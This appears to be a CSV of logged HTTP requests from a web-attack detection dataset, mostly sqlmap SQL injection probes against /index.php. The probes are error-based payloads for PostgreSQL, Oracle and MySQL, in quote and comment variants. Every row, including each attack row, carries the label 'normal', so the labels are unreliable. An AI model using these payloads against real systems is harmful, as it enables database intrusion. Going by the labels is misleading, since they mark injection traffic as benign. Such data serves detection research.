/,,*/* close,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 5388=cast((chr(113)||chr(107)||chr(113)||chr(106)||chr(113))||(select (case when (5388=5388) then 1 else 0 end))::text||(chr(113)||chr(113)||chr(113)||chr(118)||chr(113)) as numeric)-- gjzg,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 1080 in (select (char(113) char(107) char(113) char(106) char(113) (select (case when (1080=1080) then char(49) else char(48) end)) char(113) char(113) char(113) char(118) char(113))) and ('lnkj'='lnkj,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 1080 in (select (char(113) char(107) char(113) char(106) char(113) (select (case when (1080=1080) then char(49) else char(48) end)) char(113) char(113) char(113) char(118) char(113))) and 'gorm'='gorm,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 1080 in (select (char(113) char(107) char(113) char(106) char(113) (select (case when (1080=1080) then char(49) else char(48) end)) char(113) char(113) char(113) char(118) char(113))) and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 1080 in (select (char(113) char(107) char(113) char(106) char(113) (select (case when (1080=1080) then char(49) else char(48) end)) char(113) char(113) char(113) char(118) char(113))) and (5056=5056,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 1080 in (select (char(113) char(107) char(113) char(106) char(113) (select (case when (1080=1080) then char(49) else char(48) end)) char(113) char(113) char(113) char(118) char(113))),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 1080 in (select (char(113) char(107) char(113) char(106) char(113) (select (case when (1080=1080) then char(49) else char(48) end)) char(113) char(113) char(113) char(118) char(113)))-- lkro,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 8148=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(113)||chr(106)||chr(113)||(select (case when (8148=8148) then 1 else 0 end) from dual)||chr(113)||chr(113)||chr(113)||chr(118)||chr(113)||chr(62))) from dual) and ('gmxm'='gmxm,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 8148=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(113)||chr(106)||chr(113)||(select (case when (8148=8148) then 1 else 0 end) from dual)||chr(113)||chr(113)||chr(113)||chr(118)||chr(113)||chr(62))) from dual) and 'bjsk'='bjsk,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 8148=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(113)||chr(106)||chr(113)||(select (case when (8148=8148) then 1 else 0 end) from dual)||chr(113)||chr(113)||chr(113)||chr(118)||chr(113)||chr(62))) from dual) and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 8148=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(113)||chr(106)||chr(113)||(select (case when (8148=8148) then 1 else 0 end) from dual)||chr(113)||chr(113)||chr(113)||chr(118)||chr(113)||chr(62))) from dual) and (1076=1076,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 8148=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(113)||chr(106)||chr(113)||(select (case when (8148=8148) then 1 else 0 end) from dual)||chr(113)||chr(113)||chr(113)||chr(118)||chr(113)||chr(62))) from dual),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 8148=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(107)||chr(113)||chr(106)||chr(113)||(select (case when (8148=8148) then 1 else 0 end) from dual)||chr(113)||chr(113)||chr(113)||chr(118)||chr(113)||chr(62))) from dual)-- eiab,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","(select 8889 from(select count(*),concat(0x716b716a71,(select (elt(8889=8889,1))),0x7171717671,floor(rand(0)*2))x from information_schema.plugins group by x)a)",normal
